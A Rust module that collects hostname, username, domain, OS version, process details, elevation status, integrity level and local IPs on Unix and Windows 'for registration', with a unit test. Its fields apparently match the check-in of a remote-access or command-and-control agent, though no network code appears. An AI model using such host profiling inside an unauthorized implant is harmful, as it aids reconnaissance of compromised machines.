//! System information gathering - Accurate implementations
//!
//! Uses syscalls and OS APIs directly to ensure accuracy.
//! Environment variables are NOT trusted as they can be spoofed.

use protocol::SystemInfo;

/// Gather system information for registration
pub fn gather() -> SystemInfo {
    SystemInfo {
        hostname: get_hostname(),
        username: get_username(),
        domain: get_domain(),
        os_name: get_os_name(),
        os_version: get_os_version(),
        os_arch: std::env::consts::ARCH.to_string(),
        process_id: std::process::id(),
        process_name: get_process_name(),
        process_path: get_process_path(),
        is_elevated: is_elevated(),
        integrity_level: get_integrity_level(),
        local_ips: get_local_ips(),
    }
}

fn get_process_name() -> String {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().to_string()))
        .unwrap_or_default()
}

fn get_process_path() -> String {
    std::env::current_exe()
        .ok()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default()
}

// ============================================================================
// Unix implementations
// ============================================================================

#[cfg(unix)]
fn get_hostname() -> String {
    let mut buf = [0u8; 256];
    unsafe {
        if libc::gethostname(buf.as_mut_ptr() as *mut libc::c_char, buf.len()) == 0 {
            std::ffi::CStr::from_ptr(buf.as_ptr() as *const libc::c_char)
                .to_string_lossy()
                .into_owned()
        } else {
            // Fallback to /etc/hostname
            std::fs::read_to_string("/etc/hostname")
                .map(|s| s.trim().to_string())
                .unwrap_or_else(|_| "unknown".to_string())
        }
    }
}

#[cfg(unix)]
fn get_username() -> String {
    unsafe {
        let uid = libc::getuid();
        let pw = libc::getpwuid(uid);
        if !pw.is_null() {
            std::ffi::CStr::from_ptr((*pw).pw_name)
                .to_string_lossy()
                .into_owned()
        } else {
            // Fallback: return uid as string
            format!("uid:{}", uid)
        }
    }
}

#[cfg(unix)]
fn get_domain() -> String {
    // Try to get NIS/YP domain
    let mut buf = [0u8; 256];
    unsafe {
        if libc::getdomainname(buf.as_mut_ptr() as *mut libc::c_char, buf.len()) == 0 {
            let domain = std::ffi::CStr::from_ptr(buf.as_ptr() as *const libc::c_char)
                .to_string_lossy()
                .into_owned();
            // "(none)" is the default on many systems
            if domain != "(none)" && !domain.is_empty() {
                return domain;
            }
        }
    }

    // Try to extract from FQDN hostname
    let hostname = get_hostname();
    if let Some(dot_pos) = hostname.find('.') {
        return hostname[dot_pos + 1..].to_string();
    }

    // Try resolv.conf search domain
    if let Ok(content) = std::fs::read_to_string("/etc/resolv.conf") {
        for line in content.lines() {
            let line = line.trim();
            if line.starts_with("search ") || line.starts_with("domain ") {
                if let Some(domain) = line.split_whitespace().nth(1) {
                    return domain.to_string();
                }
            }
        }
    }

    String::new()
}

#[cfg(target_os = "linux")]
fn get_os_version() -> String {
    // Try /etc/os-release first (most accurate for distro info)
    if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
        let mut pretty_name = String::new();
        let mut name = String::new();
        let mut version_id = String::new();

        for line in content.lines() {
            if line.starts_with("PRETTY_NAME=") {
                pretty_name = line[12..].trim_matches('"').to_string();
            } else if line.starts_with("NAME=") {
                name = line[5..].trim_matches('"').to_string();
            } else if line.starts_with("VERSION_ID=") {
                version_id = line[11..].trim_matches('"').to_string();
            }
        }

        if !pretty_name.is_empty() {
            return pretty_name;
        }
        if !name.is_empty() {
            return format!("{} {}", name, version_id);
        }
    }

    // Fallback to uname for kernel version
    unsafe {
        let mut utsname: libc::utsname = std::mem::zeroed();
        if libc::uname(&mut utsname) == 0 {
            let release = std::ffi::CStr::from_ptr(utsname.release.as_ptr())
                .to_string_lossy();
            return format!("Linux {}", release);
        }
    }

    "Linux".to_string()
}

#[cfg(target_os = "macos")]
fn get_os_version() -> String {
    // Try sw_vers via sysctl
    use std::process::Command;

    if let Ok(output) = Command::new("sw_vers").arg("-productVersion").output() {
        if output.status.success() {
            let version = String::from_utf8_lossy(&output.stdout).trim().to_string();
            return format!("macOS {}", version);
        }
    }

    // Fallback to uname
    unsafe {
        let mut utsname: libc::utsname = std::mem::zeroed();
        if libc::uname(&mut utsname) == 0 {
            let release = std::ffi::CStr::from_ptr(utsname.release.as_ptr())
                .to_string_lossy();
            return format!("macOS (Darwin {})", release);
        }
    }

    "macOS".to_string()
}

#[cfg(unix)]
fn get_local_ips() -> Vec<String> {
    let mut ips = Vec::new();

    unsafe {
        let mut ifap: *mut libc::ifaddrs = std::ptr::null_mut();
        if libc::getifaddrs(&mut ifap) == 0 {
            let mut ifa = ifap;
            while !ifa.is_null() {
                let addr = (*ifa).ifa_addr;
                if !addr.is_null() {
                    let family = (*addr).sa_family as i32;

                    // IPv4
                    if family == libc::AF_INET {
                        let sockaddr_in = addr as *const libc::sockaddr_in;
                        let ip_bytes = (*sockaddr_in).sin_addr.s_addr.to_ne_bytes();
                        let ip = format!("{}.{}.{}.{}", ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]);

                        // Skip loopback
                        if !ip.starts_with("127.") {
                            ips.push(ip);
                        }
                    }
                    // IPv6
                    else if family == libc::AF_INET6 {
                        let sockaddr_in6 = addr as *const libc::sockaddr_in6;
                        let ip_bytes = (*sockaddr_in6).sin6_addr.s6_addr;

                        // Skip loopback (::1)
                        let is_loopback = ip_bytes[..15].iter().all(|&b| b == 0) && ip_bytes[15] == 1;
                        // Skip link-local (fe80::)
                        let is_link_local = ip_bytes[0] == 0xfe && (ip_bytes[1] & 0xc0) == 0x80;

                        if !is_loopback && !is_link_local {
                            let ip = format!(
                                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}",
                                u16::from_be_bytes([ip_bytes[0], ip_bytes[1]]),
                                u16::from_be_bytes([ip_bytes[2], ip_bytes[3]]),
                                u16::from_be_bytes([ip_bytes[4], ip_bytes[5]]),
                                u16::from_be_bytes([ip_bytes[6], ip_bytes[7]]),
                                u16::from_be_bytes([ip_bytes[8], ip_bytes[9]]),
                                u16::from_be_bytes([ip_bytes[10], ip_bytes[11]]),
                                u16::from_be_bytes([ip_bytes[12], ip_bytes[13]]),
                                u16::from_be_bytes([ip_bytes[14], ip_bytes[15]]),
                            );
                            ips.push(ip);
                        }
                    }
                }
                ifa = (*ifa).ifa_next;
            }
            libc::freeifaddrs(ifap);
        }
    }

    // Deduplicate
    ips.sort();
    ips.dedup();
    ips
}

#[cfg(unix)]
fn is_elevated() -> bool {
    unsafe { libc::geteuid() == 0 }
}

#[cfg(unix)]
fn get_integrity_level() -> String {
    // Unix doesn't have Windows-style integrity levels
    // Return equivalent based on euid
    if is_elevated() {
        "root".to_string()
    } else {
        "user".to_string()
    }
}

// ============================================================================
// Windows implementations
// ============================================================================

#[cfg(windows)]
fn get_hostname() -> String {
    use windows_sys::Win32::System::SystemInformation::{
        ComputerNameDnsHostname, GetComputerNameExW,
    };

    let mut size: u32 = 0;
    unsafe {
        // Get required buffer size
        GetComputerNameExW(ComputerNameDnsHostname, std::ptr::null_mut(), &mut size);

        if size > 0 {
            let mut buffer: Vec<u16> = vec![0; size as usize];
            if GetComputerNameExW(ComputerNameDnsHostname, buffer.as_mut_ptr(), &mut size) != 0 {
                return String::from_utf16_lossy(&buffer[..size as usize]);
            }
        }
    }

    // Fallback to environment variable
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(windows)]
fn get_username() -> String {
    use windows_sys::Win32::System::WindowsProgramming::GetUserNameW;

    let mut size: u32 = 256;
    let mut buffer: Vec<u16> = vec![0; size as usize];

    unsafe {
        if GetUserNameW(buffer.as_mut_ptr(), &mut size) != 0 && size > 1 {
            return String::from_utf16_lossy(&buffer[..(size - 1) as usize]);
        }
    }

    // Fallback
    std::env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string())
}

#[cfg(windows)]
fn get_domain() -> String {
    use windows_sys::Win32::System::SystemInformation::{
        ComputerNameDnsDomain, GetComputerNameExW,
    };

    let mut size: u32 = 0;
    unsafe {
        GetComputerNameExW(ComputerNameDnsDomain, std::ptr::null_mut(), &mut size);

        if size > 0 {
            let mut buffer: Vec<u16> = vec![0; size as usize];
            if GetComputerNameExW(ComputerNameDnsDomain, buffer.as_mut_ptr(), &mut size) != 0 {
                let domain = String::from_utf16_lossy(&buffer[..size as usize]);
                if !domain.is_empty() {
                    return domain;
                }
            }
        }
    }

    // Try USERDOMAIN environment variable as fallback
    std::env::var("USERDOMAIN").unwrap_or_default()
}

#[cfg(windows)]
fn get_os_version() -> String {
    use windows_sys::Win32::System::SystemInformation::{
        GetVersionExW, OSVERSIONINFOW,
    };

    unsafe {
        let mut osvi: OSVERSIONINFOW = std::mem::zeroed();
        osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;

        if GetVersionExW(&mut osvi) != 0 {
            let major = osvi.dwMajorVersion;
            let minor = osvi.dwMinorVersion;
            let build = osvi.dwBuildNumber;

            // Map version numbers to Windows names
            let name = match (major, minor) {
                (10, 0) if build >= 22000 => "Windows 11",
                (10, 0) => "Windows 10",
                (6, 3) => "Windows 8.1",
                (6, 2) => "Windows 8",
                (6, 1) => "Windows 7",
                (6, 0) => "Windows Vista",
                _ => "Windows",
            };

            return format!("{} Build {}", name, build);
        }
    }

    "Windows".to_string()
}

#[cfg(windows)]
fn get_local_ips() -> Vec<String> {
    use windows_sys::Win32::NetworkManagement::IpHelper::{
        GetAdaptersAddresses, GAA_FLAG_SKIP_ANYCAST, GAA_FLAG_SKIP_MULTICAST,
        IP_ADAPTER_ADDRESSES_LH,
    };
    use windows_sys::Win32::Networking::WinSock::{AF_INET, AF_INET6, AF_UNSPEC};

    let mut ips = Vec::new();
    let flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;

    unsafe {
        // Get required buffer size
        let mut size: u32 = 0;
        GetAdaptersAddresses(AF_UNSPEC as u32, flags, std::ptr::null_mut(), std::ptr::null_mut(), &mut size);

        if size == 0 {
            return ips;
        }

        let mut buffer: Vec<u8> = vec![0; size as usize];
        let adapters = buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH;

        if GetAdaptersAddresses(AF_UNSPEC as u32, flags, std::ptr::null_mut(), adapters, &mut size) == 0 {
            let mut adapter = adapters;
            while !adapter.is_null() {
                let mut unicast = (*adapter).FirstUnicastAddress;
                while !unicast.is_null() {
                    let sockaddr = (*unicast).Address.lpSockaddr;
                    if !sockaddr.is_null() {
                        let family = (*sockaddr).sa_family;

                        if family == AF_INET as u16 {
                            let sockaddr_in = sockaddr as *const windows_sys::Win32::Networking::WinSock::SOCKADDR_IN;
                            let ip_bytes = (*sockaddr_in).sin_addr.S_un.S_un_b;
                            let ip = format!("{}.{}.{}.{}",
                                ip_bytes.s_b1, ip_bytes.s_b2, ip_bytes.s_b3, ip_bytes.s_b4);

                            if !ip.starts_with("127.") {
                                ips.push(ip);
                            }
                        } else if family == AF_INET6 as u16 {
                            let sockaddr_in6 = sockaddr as *const windows_sys::Win32::Networking::WinSock::SOCKADDR_IN6;
                            let ip_bytes = (*sockaddr_in6).sin6_addr.u.Byte;

                            // Skip loopback and link-local
                            let is_loopback = ip_bytes[..15].iter().all(|&b| b == 0) && ip_bytes[15] == 1;
                            let is_link_local = ip_bytes[0] == 0xfe && (ip_bytes[1] & 0xc0) == 0x80;

                            if !is_loopback && !is_link_local {
                                let ip = format!(
                                    "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}",
                                    u16::from_be_bytes([ip_bytes[0], ip_bytes[1]]),
                                    u16::from_be_bytes([ip_bytes[2], ip_bytes[3]]),
                                    u16::from_be_bytes([ip_bytes[4], ip_bytes[5]]),
                                    u16::from_be_bytes([ip_bytes[6], ip_bytes[7]]),
                                    u16::from_be_bytes([ip_bytes[8], ip_bytes[9]]),
                                    u16::from_be_bytes([ip_bytes[10], ip_bytes[11]]),
                                    u16::from_be_bytes([ip_bytes[12], ip_bytes[13]]),
                                    u16::from_be_bytes([ip_bytes[14], ip_bytes[15]]),
                                );
                                ips.push(ip);
                            }
                        }
                    }
                    unicast = (*unicast).Next;
                }
                adapter = (*adapter).Next;
            }
        }
    }

    ips.sort();
    ips.dedup();
    ips
}

#[cfg(windows)]
fn is_elevated() -> bool {
    use windows_sys::Win32::Foundation::HANDLE;
    use windows_sys::Win32::Security::{
        GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
    };
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token: HANDLE = 0;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }

        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size: u32 = 0;

        let result = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );

        windows_sys::Win32::Foundation::CloseHandle(token);

        result != 0 && elevation.TokenIsElevated != 0
    }
}

#[cfg(windows)]
fn get_integrity_level() -> String {
    use windows_sys::Win32::Foundation::HANDLE;
    use windows_sys::Win32::Security::{
        GetTokenInformation, TokenIntegrityLevel, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
        GetSidSubAuthority, GetSidSubAuthorityCount,
    };
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    // Windows integrity level RIDs (from winnt.h)
    const SECURITY_MANDATORY_UNTRUSTED_RID: u32 = 0x0000;
    const SECURITY_MANDATORY_LOW_RID: u32 = 0x1000;
    const SECURITY_MANDATORY_MEDIUM_RID: u32 = 0x2000;
    const SECURITY_MANDATORY_HIGH_RID: u32 = 0x3000;
    const SECURITY_MANDATORY_SYSTEM_RID: u32 = 0x4000;

    unsafe {
        let mut token: HANDLE = 0;
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return "Unknown".to_string();
        }

        // Get required buffer size
        let mut size: u32 = 0;
        GetTokenInformation(token, TokenIntegrityLevel, std::ptr::null_mut(), 0, &mut size);

        if size == 0 {
            windows_sys::Win32::Foundation::CloseHandle(token);
            return "Unknown".to_string();
        }

        let mut buffer: Vec<u8> = vec![0; size as usize];
        let label = buffer.as_mut_ptr() as *mut TOKEN_MANDATORY_LABEL;

        if GetTokenInformation(token, TokenIntegrityLevel, label as *mut _, size, &mut size) == 0 {
            windows_sys::Win32::Foundation::CloseHandle(token);
            return "Unknown".to_string();
        }

        let sid = (*label).Label.Sid;
        let count = *GetSidSubAuthorityCount(sid);
        let rid = *GetSidSubAuthority(sid, (count - 1) as u32);

        windows_sys::Win32::Foundation::CloseHandle(token);

        match rid {
            SECURITY_MANDATORY_UNTRUSTED_RID => "Untrusted".to_string(),
            SECURITY_MANDATORY_LOW_RID => "Low".to_string(),
            SECURITY_MANDATORY_MEDIUM_RID => "Medium".to_string(),
            SECURITY_MANDATORY_HIGH_RID => "High".to_string(),
            SECURITY_MANDATORY_SYSTEM_RID => "System".to_string(),
            _ => format!("RID:{}", rid),
        }
    }
}

// ============================================================================
// Common / fallback implementations
// ============================================================================

fn get_os_name() -> String {
    #[cfg(target_os = "linux")]
    {
        "Linux".to_string()
    }
    #[cfg(target_os = "windows")]
    {
        "Windows".to_string()
    }
    #[cfg(target_os = "macos")]
    {
        "macOS".to_string()
    }
    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        std::env::consts::OS.to_string()
    }
}

// Fallback for non-Linux Unix (BSD, etc.)
#[cfg(all(unix, not(any(target_os = "linux", target_os = "macos"))))]
fn get_os_version() -> String {
    unsafe {
        let mut utsname: libc::utsname = std::mem::zeroed();
        if libc::uname(&mut utsname) == 0 {
            let sysname = std::ffi::CStr::from_ptr(utsname.sysname.as_ptr())
                .to_string_lossy();
            let release = std::ffi::CStr::from_ptr(utsname.release.as_ptr())
                .to_string_lossy();
            format!("{} {}", sysname, release)
        } else {
            std::env::consts::OS.to_string()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gather_system_info() {
        let info = gather();

        // These should never be empty
        assert!(!info.hostname.is_empty(), "hostname should not be empty");
        assert!(!info.username.is_empty(), "username should not be empty");
        assert!(!info.os_name.is_empty(), "os_name should not be empty");
        assert!(!info.os_arch.is_empty(), "os_arch should not be empty");
        assert!(info.process_id > 0, "process_id should be > 0");

        // Print for manual verification
        println!("System Info:");
        println!("  Hostname: {}", info.hostname);
        println!("  Username: {}", info.username);
        println!("  Domain: {}", info.domain);
        println!("  OS: {} {}", info.os_name, info.os_version);
        println!("  Arch: {}", info.os_arch);
        println!("  PID: {}", info.process_id);
        println!("  Process: {} ({})", info.process_name, info.process_path);
        println!("  Elevated: {}", info.is_elevated);
        println!("  Integrity: {}", info.integrity_level);
        println!("  IPs: {:?}", info.local_ips);
    }
}
